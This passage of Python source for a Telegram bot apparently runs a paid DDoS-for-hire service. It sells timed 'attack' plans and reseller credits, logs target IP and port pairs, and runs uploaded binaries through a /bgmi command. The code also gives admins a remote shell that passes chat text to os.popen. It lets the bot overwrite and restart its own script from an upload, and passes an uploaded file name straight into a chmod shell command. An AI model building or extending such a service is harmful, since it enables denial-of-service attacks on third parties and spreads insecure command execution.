    res = "🎫 <b>𝐀𝐋𝐋 𝐊𝐄𝐘𝐒 𝐑𝐄𝐏𝐎𝐑𝐓</b>\n"
    res += "━━━━━━━━━━━━━━━━━━━━━━\n"
    res += f"🆕 <b>𝐔𝐍𝐔𝐒𝐄𝐃 𝐊𝐄𝐘𝐒 ({len(unused_keys)}):</b>\n"
    
    if unused_keys:
        for k in unused_keys[-15:]: # Last 15 unused keys
            res += f"• <code>{k['key']}</code> ({k['duration_hours']}h)\n"
    else:
        res += "<i>No unused keys available.</i>\n"

    res += "━━━━━━━━━━━━━━━━━━━━━━\n"

    # 2. USED KEYS SECTION
    res += f"✅ <b>𝐔𝐒𝐄𝐃 𝐊𝐄𝐘𝐒 ({len(used_keys)}):</b>\n"
    
    if used_keys:
        for k in used_keys[-10:]: # Last 10 used keys for history
            res += f"• <code>{k['key']}</code> 👤 <code>{k['used_by']}</code>\n"
    else:
        res += "<i>No keys used yet.</i>\n"

    res += f"━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>𝐎𝐰𝐧𝐞𝐫:</b> {CONFIG['footer']}"

    # Handle long messages
    try:
        bot.reply_to(message, res, parse_mode="HTML")
    except:
        bot.reply_to(message, "⚠️ <b>Message too long!</b> Database mein bahut saari keys hain. Main sirf short report bhej sakta hoon.", parse_mode="HTML")
        
@bot.message_handler(commands=['myinfo'])
def check_my_info_final(message):
    user_id = str(message.chat.id)
    db = load_db()
    
    # Database se data nikalna
    expiry_str = db.get('users', {}).get(user_id, "No Active Plan")
    reseller_data = db.get('resellers', {}).get(user_id)
    credits = reseller_data.get('credits', 0) if reseller_data else 0
    
    # 1. Role aur Display Logic
    if user_id in ADMIN_IDS:
        role = "Owner 👑 (Admin)"
        expiry_display = "Lifetime ♾️"
        credit_display = "Unlimited ♾️"
        show_credits = True # Admin ko credits dikhenge
    elif reseller_data:
        role = "Reseller 🤝"
        expiry_display = expiry_str if expiry_str != "No Active Plan" else "N/A"
        credit_display = f"{credits}"
        show_credits = True # Reseller ko uske credits dikhenge
    else:
        role = "Premium User ⚡" if has_access(user_id) else "Free User 👤"
        expiry_display = expiry_str
        show_credits = False # Normal User ko credit option hide rahega

    # 2. Time Remaining Calculation
    remaining_time = "Expired"
    if expiry_str != "No Active Plan" and user_id not in ADMIN_IDS:
        try:
            exp_dt = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
            now = datetime.now()
            if exp_dt > now:
                diff = exp_dt - now
                days = diff.days
                hours, rem = divmod(diff.seconds, 3600)
                remaining_time = f"<code>{days}d {hours}h</code>"
            else:
                remaining_time = "Expired ❌"
        except:
            remaining_time = "Invalid Data"

    # 3. Message Building (Customized for each role)
    info_msg = (
        f"👤 <b>𝐔𝐒𝐄𝐑 𝐏𝐑𝐎𝐅𝐈𝐋𝐄 𝐂𝐀𝐑𝐃</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 <b>𝐈𝐃:</b> <code>{user_id}</code>\n"
        f"⚡ <b>𝐑𝐚𝐧𝐤:</b> <b>{role}</b>\n"
        f"📅 <b>𝐄𝐱𝐩𝐢𝐫𝐲:</b> <code>{expiry_display}</code>\n"
    )

    # Sirf Admin/Reseller ke liye Time Left aur Credits dikhana
    if user_id not in ADMIN_IDS:
        info_msg += f"⏳ <b>𝐋𝐞𝐟𝐭:</b> {remaining_time}\n"
    
    if show_credits:
        info_msg += f"💰 <b>𝐂𝐫𝐞𝐝𝐢𝐭𝐬:</b> <code>{credit_display}</code>\n"

    info_msg += (
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👑 <b>𝐃𝐄𝐕:</b> {CONFIG['footer']}"
    )
    
    try:
        bot.reply_to(message, info_msg, parse_mode="HTML")
    except Exception as e:
        print(f"MyInfo Error: {e}")

@bot.message_handler(commands=['check'])
def check_user_id(message):
    user_id = str(message.chat.id)
    db = load_db()
    
    # Check if sender is Admin or Reseller
    is_admin = user_id in ADMIN_IDS
    is_reseller = user_id in db.get('resellers', {})

    if not is_admin and not is_reseller:
        bot.reply_to(message, "❌ <b>𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝!</b>\nSirf Resellers aur Admin hi check kar sakte hain.", parse_mode="HTML")
        return

    cmd = message.text.split()
    if len(cmd) < 2:
        bot.reply_to(message, "⚠️ <b>𝐔𝐬𝐚𝐠𝐞:</b> /check [user_id]", parse_mode="HTML")
        return

    target_id = str(cmd[1])
    
    # Database se target ki details nikalna
    user_data = db.get('users', {}).get(target_id)
    reseller_info = db.get('resellers', {}).get(target_id)

    if user_data:
        expiry_dt = datetime.strptime(user_data, '%Y-%m-%d %H:%M:%S')
        now = datetime.now()
        
        if expiry_dt > now:
            time_left = expiry_dt - now
            days = time_left.days
            hours, remainder = divmod(time_left.seconds, 3600)
            minutes, _ = divmod(remainder, 60)
            
            status = "✅ <b>𝐀𝐂𝐓𝐈𝐕𝐄</b>"
            remaining_text = f"<code>{days}d {hours}h {minutes}m</code>"
        else:
            status = "❌ <b>𝐄𝐗𝐏𝐈𝐑𝐄𝐃</b>"
            remaining_text = "<code>None</code>"

        res = (
            f"🔍 <b>𝐔𝐒𝐄𝐑 𝐒𝐓𝐀𝐓𝐔𝐒 𝐂𝐇𝐄𝐂𝐊</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 <b>𝐈𝐃:</b> <code>{target_id}</code>\n"
            f"📊 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> {status}\n"
            f"⏳ <b>𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠:</b> {remaining_text}\n"
            f"📅 <b>𝐄𝐱𝐩𝐢𝐫𝐲:</b> <code>{user_data}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
        )
        
        if reseller_info:
            res += f"💰 <b>𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐂𝐫𝐞𝐝𝐢𝐭𝐬:</b> <code>{reseller_info.get('credits', 0)}</code>\n"
            
        bot.reply_to(message, res, parse_mode="HTML")
    else:
        bot.reply_to(message, f"❌ <b>𝐍𝐨𝐭 𝐅𝐨𝐮𝐧𝐝!</b>\nUser <code>{target_id}</code> database mein nahi hai.", parse_mode="HTML")
        
@bot.message_handler(commands=['plan'])
def view_plans_pro(message):
    # Professional VIP Plan Design
    plan_msg = (
        f" ✅ 𝐏𝐎𝐖𝐄𝐑 𝐕𝐈𝐏 𝐌𝐄𝐍𝐔</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 <b>𝐔𝐒𝐄𝐑 𝐀𝐓𝐓𝐀𝐂𝐊 𝐏𝐋𝐀𝐍𝐒</b>\n"
        f"🕒 1 Hour Attack: ₹20\n"
        f"🗓️ 1 Day Full Access: ₹80\n"
        f"📅 30 Days (Monthly): ₹400\n"
        f"<i>(Unlimited Attacks + Time Stacking)</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤝 <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑 𝐂𝐑𝐄𝐃𝐈𝐓 𝐏𝐋𝐀𝐍𝐒</b>\n"
        f"💰 30 Credits: ₹400\n"
        f"💰 50 Credits: ₹800\n"
        f"💰 500 Credits: ₹2500\n"
        f"<i>(1 Credit = 1 Hour Key Generation)</i>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ <b>𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒:</b>\n"
        f"• Instant Key Generation\n"
        f"• 24/7 Live Status Support\n"
        f"• No Cooldown for Resellers\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📞 <b>𝐁𝐮𝐲 𝐍𝐨𝐰:</b> {CONFIG['footer']}"
    )
    
    try:
        bot.reply_to(message, plan_msg, parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, "❌ <b>Plan menu error!</b> Contact Admin.", parse_mode="HTML")

@bot.message_handler(commands=['stop'])
def stop_all_attacks_pro(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin access
    if user_id not in ADMIN_IDS:
        return

    # Attack count check
    attack_count = len(active_attacks)

    if attack_count > 0:
        # Saare active attacks ko khatam karna
        active_attacks.clear()
        
        res = (
            f"🛑 <b>𝐒𝐘𝐒𝐓𝐄𝐌 ⚡ 𝐅𝐎𝐑𝐂𝐄 𝐒𝐓𝐎𝐏</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 <b>𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐓𝐞𝐫𝐦𝐢𝐧𝐚𝐭𝐞𝐝:</b> <code>{attack_count}</code>\n"
            f"🚀 <b>𝐒𝐥𝐨𝐭𝐬 𝐒𝐭𝐚𝐭𝐮𝐬:</b> <code>0/{CONFIG['max_slots']} (Cleared)</code>\n"
            f"🛡️ <b>𝐒𝐲𝐬𝐭𝐞𝐦:</b> 🟢 𝐑𝐞𝐚𝐝𝐲 𝐟𝐨𝐫 𝐍𝐞𝐰 𝐓𝐚𝐬𝐤𝐬\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👤 <b>𝐀𝐝𝐦𝐢𝐧:</b> <code>{user_id}</code>"
        )
    else:
        res = "❌ <b>No Active Attacks found to stop!</b>"

    bot.reply_to(message, res, parse_mode="HTML")

@bot.message_handler(commands=['logs'])
def show_logs_pro(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin access
    if user_id not in ADMIN_IDS:
        return

    db = load_db()
    # Sirf wahi keys nikalna jo use ho chuki hain
    used_keys = [k for k in db.get('keys', []) if k['status'] == "used"]
    
    if not used_keys:
        bot.reply_to(message, "📑 <b>𝐍𝐨 𝐫𝐞𝐝𝐞𝐦𝐩𝐭𝐢𝐨𝐧 𝐥𝐨𝐠𝐬 𝐟𝐨𝐮𝐧𝐝.</b>", parse_mode="HTML")
        return

    # Last 10 logs nikalna
    log_msg = "📑 <b>𝐑𝐄𝐃𝐄𝐄𝐌 𝐋𝐎𝐆𝐒 (𝐋𝐚𝐬𝐭 𝟏𝟎)</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    
    for k in used_keys[-10:]:
        # Duration ko d/h/m me convert karne ki zaroorat nahi, 
        # kyunki humne genkey me input duration save ki thi
        duration = k.get('duration_hours', 0)
        
        log_msg += (
            f"👤 <b>𝐔𝐬𝐞𝐫:</b> <code>{k['used_by']}</code>\n"
            f"🎫 <b>𝐊𝐞𝐲:</b> <code>{k['key']}</code>\n"
            f"⏳ <b>𝐓𝐢𝐦𝐞:</b> <code>{duration}h</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
        )
    
    bot.reply_to(message, log_msg, parse_mode="HTML")

@bot.message_handler(commands=['owner'])
def show_owner_dashboard(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin access
    if user_id not in ADMIN_IDS:
        return

    db = load_db()
    
    # Data nikalna
    users_list = db.get('users', {})
    resellers_list = db.get('resellers', {})
    
    # Counters
    total_users = len(users_list)
    total_resellers = len(resellers_list)
    
    # Message Build karna
    res = (
        f"👑 <b>𝐎𝐖𝐍𝐄𝐑 𝐌𝐀𝐒𝐓𝐄𝐑 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>𝐒𝐭𝐚𝐭𝐬:</b>\n"
        f"👥 Total Premium Users: <code>{total_users}</code>\n"
        f"🤝 Total Resellers: <code>{total_resellers}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
    )

    # All Users List
    if total_users > 0:
        res += "👤 <b>𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑𝐒:</b>\n"
        for uid, expiry in users_list.items():
            res += f"• <code>{uid}</code> (Exp: {expiry[:10]})\n"
    else:
        res += "👤 <b>𝐏𝐑𝐄𝐌𝐈𝐔𝐌 𝐔𝐒𝐄𝐑𝐒:</b> <code>None</code>\n"

    res += "\n"

    # All Resellers List
    if total_resellers > 0:
        res += "🤝 <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑𝐒:</b>\n"
        for rid, data in resellers_list.items():
            credits = data.get('credits', 0)
            res += f"• <code>{rid}</code> (Credits: {credits})\n"
    else:
        res += "🤝 <b>𝐑𝐄𝐒𝐄𝐋𝐋𝐄𝐑𝐒:</b> <code>None</code>\n"

    res += f"━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>𝐎𝐰𝐧𝐞𝐫:</b> {CONFIG['footer']}"

    # Agar list bahut lambi ho jaye toh split karke bhejna
    try:
        bot.reply_to(message, res, parse_mode="HTML")
    except:
        bot.reply_to(message, "⚠️ <b>List is too long!</b> Database check karein.", parse_mode="HTML")

@bot.message_handler(commands=['mylogs'])
def my_logs(message):
    user_id = str(message.chat.id)
    # Maan lijiye aapne attacks ko database mein save kiya hai
    db = load_db()
    user_history = [a for a in db.get('attack_logs', []) if a['user_id'] == user_id]

    if not user_history:
        bot.reply_to(message, "❌ <b>No attack history found!</b>", parse_mode="HTML")
        return

    res = "📜 <b>𝐘𝐎𝐔𝐑 𝐑𝐄𝐂𝐄𝐍𝐓 𝐀𝐓𝐓𝐀𝐂𝐊𝐒</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for attack in user_history[-5:]: # Last 5 attacks
        res += f"🎯 <code>{attack['ip']}:{attack['port']}</code> | 🕒 {attack['time']}s\n"
    
    bot.reply_to(message, res, parse_mode="HTML")
 
@bot.message_handler(commands=['delkey', 'dk'])
def delete_key_advanced(message):
    user_id = str(message.chat.id)
    db = load_db()
    
    # [span_2](start_span)Access Check: Sirf Admin aur Reseller hi use kar sakte hain[span_2](end_span)
    is_admin = user_id in ADMIN_IDS
    is_reseller = user_id in db.get('resellers', {})
    if not (is_admin or is_reseller): 
        return

    cmd = message.text.split()
    
    # [ USAGE / HELP ]
    if len(cmd) < 3:
        usage_msg = (
            "🗑️ <b>𝐃𝐄𝐋𝐄𝐓𝐄 𝐊𝐄𝐘 𝐌𝐄𝐍𝐔</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Aap do tarike se keys delete kar sakte hain:\n\n"
            "🔹 <b>𝐌𝐨𝐝𝐞 𝟏: Unused Keys (By Amount)</b>\n"
            "Isse aap purani unused keys bulk mein delete kar sakte hain.\n"
            "📝 <b>Usage:</b> <code>/dk unused 5</code>\n\n"
            "🔹 <b>𝐌𝐨𝐝𝐞 𝟐: Specific Key (Used/Unused)</b>\n"
            "Isse aap kisi bhi ek specific key ko delete kar sakte hain.\n"
            "📝 <b>Usage:</b> <code>/dk key DRX-A1B2-C3D4</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        bot.reply_to(message, usage_msg, parse_mode="HTML")
        return

    mode = cmd[1].lower()
    target = cmd[2]
    keys_list = db.get('keys', [])

    # -[span_4](start_span)-- MODE 1: UNUSED KEYS BY AMOUNT ---[span_4](end_span)
    if mode == "unused":
        try:
            amount = int(target)
            count = 0
            new_keys = []
            # [span_5](start_span)Peeche se (latest) unused keys ko filter karna[span_5](end_span)
            for k in reversed(keys_list):
                if k['status'] == "unused" and count < amount:
                    count += 1
                    continue
                new_keys.append(k)
            
            db['keys'] = list(reversed(new_keys))
            save_db(db)
            bot.reply_to(message, f"✅ <b>{count} Unused keys deleted successfully!</b>", parse_mode="HTML")
        except ValueError:
            bot.reply_to(message, "❌ <b>Amount</b> ek number hona chahiye (Example: 5).")

    # -[span_6](start_span)-- MODE 2: SPECIFIC KEY DELETE ---[span_6](end_span)
    elif mode == "key":
        initial_len = len(keys_list)
        # [span_7](start_span)Database se matching key ko hatana[span_7](end_span)
        db['keys'] = [k for k in keys_list if k['key'] != target]
        
        if len(db['keys']) < initial_len:
            save_db(db)
            bot.reply_to(message, f"✅ <b>𝐊𝐄𝐘 𝐃𝐄𝐋𝐄𝐓𝐄𝐃:</b> <code>{target}</code>", parse_mode="HTML")
        else:
            bot.reply_to(message, "❌ <b>Key nahi mili!</b> Sahi key enter karein.")
                   
# --- [ COMMAND: CUSTOMIZE (ADMIN ONLY) ] ---
@bot.message_handler(commands=['customize'])
def customize_bot_fixed(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin access
    if user_id not in ADMIN_IDS:
        return

    cmd = message.text.split()
    
    # Check if format is: /customize <setting> <value>
    if len(cmd) == 3:
        setting = cmd[1].lower()
        value = cmd[2]

        if setting in CONFIG:
            # 1. Integer settings (Numbers)
            if setting in ["max_time", "max_slots", "cooldown", "feedback_group_id"]:
                try:
                    CONFIG[setting] = int(value)
                    res = f"✅ Setting <code>{setting}</code> updated to <b>{value}</b>"
                except ValueError:
                    res = "❌ <b>Error:</b> Value must be a number!"

            # 2. Boolean settings (True/False for Maintenance)
            elif setting == "maintenance":
                if value.lower() == "on":
                    CONFIG["maintenance"] = True
                    res = "🚧 <b>Maintenance Mode:</b> 🔴 ON"
                elif value.lower() == "off":
                    CONFIG["maintenance"] = False
                    res = "🚧 <b>Maintenance Mode:</b> 🟢 OFF"
                else:
                    res = "❌ Use 'on' or 'off' for maintenance!"

            # 3. String settings (Footer/Text)
            else:
                CONFIG[setting] = value
                res = f"✅ Setting <code>{setting}</code> updated to <b>{value}</b>"
            
            bot.reply_to(message, res, parse_mode="HTML")
        else:
            bot.reply_to(message, "❌ <b>Invalid Setting!</b>\nOptions: max_time, max_slots, cooldown, maintenance, footer", parse_mode="HTML")
    else:
        # Help message for Admin
        help_msg = (
            "⚙️ <b>𝐂𝐔𝐒𝐓𝐎𝐌𝐈𝐙𝐄 𝐏𝐀𝐍𝐄𝐋</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "💡 <b>Usage:</b> <code>/customize [setting] [value]</code>\n\n"
            "🔹 <code>/customize max_time 300</code>\n"
            "🔹 <code>/customize cooldown 60</code>\n"
            "🔹 <code>/customize maintenance on/off</code>\n"
            "🔹 <code>/customize max_slots 10</code>"
            "🔹 <code>/customize feedback_group_id id</code>\n"
        )
        bot.reply_to(message, help_msg, parse_mode="HTML")

# --- [ UPDATED DOWNLOAD COMMAND ] ---
@bot.message_handler(commands=['download_file'])
def ask_password_for_download(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS: 
        return

    # Ask the admin for the password
    msg = bot.reply_to(message, "🔐 <b>𝐒𝐄𝐂𝐔𝐑𝐈𝐓𝐘 𝐂𝐇𝐄𝐂𝐊</b>\nPlease enter the Admin Password to download the script:", parse_mode="HTML")
    
    # Register the next step to catch the password input
    bot.register_next_step_handler(msg, verify_password_and_send)

def verify_password_and_send(message):
    user_id = str(message.chat.id)
    user_input = message.text

    if user_input == DOWNLOAD_PASSWORD:
        # If password matches, proceed with file detection and sending
        file_to_send = SCRIPT_NAME if os.path.exists(SCRIPT_NAME) else "drx.py"
        
        try:
            if os.path.exists(file_to_send):
                with open(file_to_send, "rb") as f:
                    bot.send_document(
                        message.chat.id, 
                        f, 
                        caption=f"📂 <b>𝐃𝐑𝐗-𝐏𝐎𝐖𝐄𝐑 𝐁𝐀𝐂𝐊𝐔𝐏</b>\n📄 File: <code>{file_to_send}</code>\n✅ Access Granted.",
                        parse_mode="HTML"
                    )
            else:
                bot.reply_to(message, "❌ <b>File Not Found!</b>")
        except Exception as e:
            bot.reply_to(message, f"❌ Error: {str(e)}")
    else:
        # If password is wrong
        bot.reply_to(message, "🚫 <b>𝐈𝐍𝐕𝐀𝐋𝐈𝐃 𝐏𝐀𝐒𝐒𝐖𝐎𝐑𝐃!</b>\nAccess Denied. Command cancelled.", parse_mode="HTML")

@bot.message_handler(content_types=['document'])
def handle_universal_upload(message):
    user_id = str(message.chat.id)
    
    # 🛡️ Sirf Admin ke liye access
    if user_id not in ADMIN_IDS: 
        return

    file_name = message.document.file_name
    caption = message.caption

    try:
        # --- [ CASE 1: SCRIPT UPDATE ] ---
        if caption == "/upload_file":
            bot.reply_to(message, "⏳ <b>𝐔𝐩𝐝𝐚𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐭𝐞𝐫 𝐒𝐜𝐫𝐢𝐩𝐭...</b>", parse_mode="HTML")
            
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # SCRIPT_NAME wahi file hai jo abhi chal rahi hai
            current_script = sys.argv[0] 
            with open(current_script, 'wb') as f:
                f.write(downloaded_file)
            
            bot.send_message(user_id, "✅ <b>𝐒𝐜𝐫𝐢𝐩𝐭 𝐔𝐩𝐝𝐚𝐭𝐞𝐝!</b>\n🔄 Restarting to apply changes...", parse_mode="HTML")
            
            # Bot Process Restart
            os.execv(sys.executable, ['python'] + sys.argv)

        # --- [ CASE 2: BINARY FILE UPLOAD ] ---
        else:
            bot.reply_to(message, f"⏳ <b>𝐒𝐞𝐭𝐭𝐢𝐧𝐠 𝐮𝐩 𝐛𝐢𝐧𝐚𝐫𝐲:</b> <code>{file_name}</code>...", parse_mode="HTML")
            
            file_info = bot.get_file(message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            
            # Binary ko server pe save karna
            with open(file_name, 'wb') as f:
                f.write(downloaded_file)
            
            # Auto-Permission dena (chmod +x)
            os.system(f"chmod +x {file_name}")
            
            bot.reply_to(message, (
                f"🚀 <b>𝐁𝐈𝐍𝐀𝐑𝐘 𝐑𝐄𝐀𝐃𝐘!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📁 <b>𝐅𝐢𝐥𝐞:</b> <code>{file_name}</code>\n"
                f"🛡️ <b>𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧:</b> <code>chmod +x</code> (Applied)\n"
                f"💡 <i>Ab aap ise /bgmi me use kar sakte hain.</i>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            ), parse_mode="HTML")

    except Exception as e:
        bot.reply_to(message, f"❌ <b>Upload Error:</b>\n<code>{str(e)}</code>", parse_mode="HTML")

# --- [ BONUS: REMOTE TERMINAL COMMAND ] ---
@bot.message_handler(commands=['run'])
def run_remote_terminal(message):
    if str(message.chat.id) not in ADMIN_IDS: return
    
    cmd_text = message.text.split(maxsplit=1)
    if len(cmd_text) < 2:
        bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/run ls</code>", parse_mode="HTML")
        return
    
    try:
        output = os.popen(cmd_text[1]).read()
        bot.reply_to(message, f"🖥️ <b>𝐓𝐞𝐫𝐦𝐢𝐧𝐚𝐥:</b>\n<pre>{output if output else 'Done (No Output)'}</pre>", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['news'])
def send_news(message):
    user_id = str(message.chat.id)
    
    # Sirf Admin access
    if user_id not in ADMIN_IDS:
        return

    # Check agar message khali hai
    cmd_text = message.text.split(maxsplit=1)
    if len(cmd_text) < 2:
        bot.reply_to(message, "❌ <b>Usage:</b> <code>/news [Your Message]</code>", parse_mode="HTML")
        return

    news_content = cmd_text[1]
    db = load_db()
    all_users = db.get('all_users', [])

    if not all_users:
        bot.reply_to(message, "❌ No users found in database!")
        return

    bot.reply_to(message, f"🚀 <b>Sending News to {len(all_users)} users...</b>", parse_mode="HTML")

    success = 0
    failed = 0

    for uid in all_users:
        try:
            # Professional News Layout
            bot.send_message(uid, (
                f"🛰️ <b>𝐀𝐏𝐑𝐎𝐗-𝐏𝐎𝐖𝐄𝐑 𝐁𝐎𝐓 𝐔𝐏𝐃𝐀𝐓𝐄</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{news_content}\n\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📅 <b>𝐃𝐚𝐭𝐞:</b> <code>{datetime.now().strftime('%d-%m-%Y')}</code>\n"
                f"👑 <b>𝐀𝐝𝐦𝐢𝐧:</b> {CONFIG['footer']}"
            ), parse_mode="HTML")
            success += 1
        except Exception:
            failed += 1

    # Final Report to Admin
    bot.reply_to(message, (
        f"✅ <b>𝐍𝐞𝐰𝐬 𝐃𝐞𝐥𝐢𝐯𝐞𝐫𝐲 𝐑𝐞𝐩𝐨𝐫𝐭</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Total Users: <code>{len(all_users)}</code>\n"
        f"🟢 Success: <code>{success}</code>\n"
        f"🔴 Failed: <code>{failed}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    ), parse_mode="HTML")

# --- [ FEEDBACK SYSTEM LOGIC ] ---
def process_feedback_photo(message):
    user_id = str(message.chat.id)
    
    # Check agar user ne photo bheji hai
    if message.content_type == 'photo':
        # Feedback group mein photo bhejna
        bot.send_photo(
            CONFIG["feedback_group_id"], 
            message.photo[-1].file_id, 
            caption=f"🌟 <b>𝐍𝐄𝐖 𝐅𝐄𝐄𝐃𝐁𝐀𝐂𝐊</b>\n━━━━━━━━━━━━━━━━━━━━━━\n👤 <b>𝐔𝐬𝐞𝐫:</b> <code>{user_id}</code>\n🚀 <b>𝐒𝐭𝐚𝐭𝐮𝐬:</b> Attack Successful\n━━━━━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )
        
        # User ko thank you bolna
        bot.reply_to(message, "❤️ <b>𝐓𝐡𝐱𝐱 𝐟𝐨𝐫 𝐟𝐞𝐞𝐝𝐛𝐚𝐜𝐤!</b>\nAapka feedback group mein upload kar diya gaya hai.", parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ <b>𝐅𝐞𝐞𝐝𝐛𝐚𝐜𝐤 𝐂𝐚𝐧𝐜𝐞𝐥𝐥𝐞𝐝!</b>\nAapne photo nahi bheji. Agli baar attack ke baad screenshot zaroor dein.", parse_mode="HTML")

@bot.message_handler(commands=['prices'])
def price_list(message):
    prices = (
        f"💰 **𝐀𝐏𝐑𝐎𝐗-𝐏𝐎𝐖𝐄𝐑 𝐏𝐑𝐈𝐂𝐄 𝐋𝐈𝐒𝐓**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🕒 **𝟏 𝐇𝐨𝐮𝐫:** `₹20`\n"
        f"📅 **𝟏 𝐃𝐚𝐲:** `₹80`\n"
        f"🗓️ **𝟏 𝐖𝐞𝐞𝐤:** `₹300`\n"
        f"♾️ **𝐌𝐨𝐧𝐭𝐡:** `₹600`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🤝 **𝐑𝐞𝐬𝐞𝐥𝐥𝐞𝐫 𝐏𝐚𝐧𝐞𝐥:** Contact Admin\n"
        f"💳 **𝐏𝐚𝐲𝐦𝐞𝐧𝐭:** UPI / Crypto\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📲 **𝐁𝐮𝐲:** @{CONFIG['footer'].replace('@','')}"
    )
    bot.reply_to(message, prices, parse_mode="HTML")

@bot.message_handler(commands=['mykey'])
def check_key_validity(message):
    user_id = str(message.chat.id)
    db = load_db()
    user_data = db.get('users', {}).get(user_id)
    
    if not user_data:
        bot.reply_to(message, "❌ <b>No Active Plan Found!</b>", parse_mode="HTML")
        return

    expiry_dt = datetime.strptime(user_data, '%Y-%m-%d %H:%M:%S')
    remaining = expiry_dt - datetime.now()
    
    msg = (
        f"🔑 <b>𝐘𝐎𝐔𝐑 𝐊𝐄𝐘 𝐃𝐄𝐓𝐀𝐈𝐋𝐒</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏳ <b>𝐄𝐱𝐩𝐢𝐫𝐲:</b> <code>{user_data}</code>\n"
        f"📅 <b>𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠:</b> <code>{remaining.days}d {remaining.seconds//3600}h</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, msg, parse_mode="HTML")

@bot.message_handler(commands=['addgroup'])
def authorize_group(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_IDS: return # Only Admin

    cmd = message.text.split()
    if len(cmd) < 3:
        bot.reply_to(message, "⚠️ <b>Usage:</b> <code>/addgroup [GroupID] [1h/1d/1w]</code>", parse_mode="HTML")
        return

    target_group = cmd[1]
    duration_input = cmd[2].lower()

    # Time Parsing
    try:
        if duration_input.endswith('h'):
            hours = int(duration_input[:-1])
        elif duration_input.endswith('d'):
            hours = int(duration_input[:-1]) * 24
        elif duration_input.endswith('w'):
            hours = int(duration_input[:-1]) * 168
        else:
            hours = int(duration_input)
    except ValueError:
        bot.reply_to(message, "❌ Invalid duration format.")
        return

    expiry_date = (datetime.now() + timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')
    
    db = load_db()
    db.setdefault('groups', {})[target_group] = expiry_date
    save_db(db)

    bot.reply_to(message, f"✅ <b>𝐆𝐑𝐎𝐔𝐏 𝐀𝐔𝐓𝐇𝐎𝐑𝐈𝐙𝐄𝐃!</b>\n━━━━━━━━━━━━━━━━━━━━━━\n🆔 <b>𝐈𝐃:</b> <code>{target_group}</code>\n⏳ <b>𝐄𝐱𝐩𝐢𝐫𝐲:</b> <code>{expiry_date}</code>\n━━━━━━━━━━━━━━━━━━━━━━", parse_mode="HTML")
    
    # Group mein message bhejna
    try:
        bot.send_message(target_group, f"🚀 <b>𝐁𝐨𝐭 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝!</b>\nIs group ko <code>{duration_input}</code> ke liye authorize kar diya gaya hai.\nAb aap /bgmi use kar sakte hain.")
    except: pass

@bot.message_handler(commands=['delgroup'])
def remove_group(message):
    if str(message.chat.id) not in ADMIN_IDS: return
    cmd = message.text.split()
    if len(cmd) < 2: return
    
    target_group = cmd[1]
    db = load_db()
    if target_group in db.get('groups', {}):
